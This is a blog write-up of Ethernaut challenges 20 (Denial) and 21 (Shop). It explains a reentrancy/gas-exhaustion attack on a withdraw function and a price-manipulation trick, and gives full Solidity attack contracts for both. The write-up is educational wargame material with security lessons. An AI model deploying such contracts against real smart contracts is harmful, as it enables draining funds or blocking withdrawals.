---
layout: post
title:  Ethernaut challenges writeup Part V (Challenges 20 and 21).
excerpt_separator: <!--more-->
category: DeFi
---

Hello there! Today's post covers solutions for [Ethernaut](https://ethernaut.openzeppelin.com/) challenges 20 and 21.

<!--more-->

# Challenges write up

## Denial

I solved this level exploiting the fact that the contract it is vulnerable to re-entrancy attacks. As it is possible to see, it does not implement any protection against these attacks. I analyzed function `withdraw()` and quickly saw that it used a low level `call` on `partner`. This was similar to previous level [King](https://nahueldsanchez.com.ar/Solving-Ethernaut-Challenges-08-12/) but this time the contract did not care about the result of the sending operation, so it was not possible to solve it in the same way. But as you may know, unless specified, `call` forwards all the remaining Gas to the called contract. In this case, we can exploit this in two ways:

1. Using reentrancy
2. Creating an Out Of Gas exception

I used option 1 and created a contract that in its `receive` function it a call to `withdraw`, exploiting the re-entrancy issue. I set this malicious contract as partner and started the attack issuing a `withdraw()`.

It's interesting to mention the Note provided while solving the level:

```
Note: An external CALL can use at most 63/64 of the gas currently available at the time of the CALL. Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e. one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this particular attack.
```

Based on this I understand that if the vulnerable contract had less code to execute after the `CALL` instruction it could be not affected (and thus not solvable).

### Further Reading

- Secure Ether Transfer - https://fravoll.github.io/solidity-patterns/secure_ether_transfer.html
- Solidity - Transfer vs send vs call function - https://medium.com/coinmonks/solidity-transfer-vs-send-vs-call-function-64c92cfc878a
- Why using assert, since it would consume all gas - https://ethereum.stackexchange.com/questions/27812/why-using-assert-since-it-would-consume-all-gas
- Recommendations for Smart Contract Security in Solidity - https://ethereum-contract-security-techniques-and-tips.readthedocs.io/en/latest/recommendations/

### Solution source code

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IDenial {
    function withdraw() external payable;
}

contract DenialTest {

    address victim;

    constructor(address _victim) public {
        victim = _victim;
    }

    // allow deposit of funds
    receive() external payable {
        IDenial(victim).withdraw();
    }

    function attack() public {
        IDenial(victim).withdraw();
    }

}
```

## Shop

Level similar to "Elevator", in this case we can leverage the state change in the variable `isSold` in the `Shop` contract and based on that determine which price we want to return. If we see `isSold` set to `false` we know that the seller contract is asking the price to perform the verification `_buyer.price() >= price` then, we return a price higher or at least equal to `price` (100). Once the verification is done `isSold` is set to `true`. The issue relies on the fact that the Seller contract ask for the price again, and this time, the buyer contract can return a different value. I coded this solution in my contract below.

Regardless of this, the underlying issue is that contracts should not trust in other contracts and change their state based on untrusted logic.

### Solution source code

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IShop {
    function buy() external;
    function isSold() external returns (bool);
}

contract Buyer {
    uint public _price1 = 100;
    uint public _price2 = 1;
    address shop;

    constructor(address _shop) public {
        shop = _shop;
    }

    function price() public returns (uint) {
        if(!IShop(shop).isSold()) {
            return _price1;
        } else {
            return _price2;
        }
    }

    function buy() public {
        IShop(shop).buy();
    }
}
```

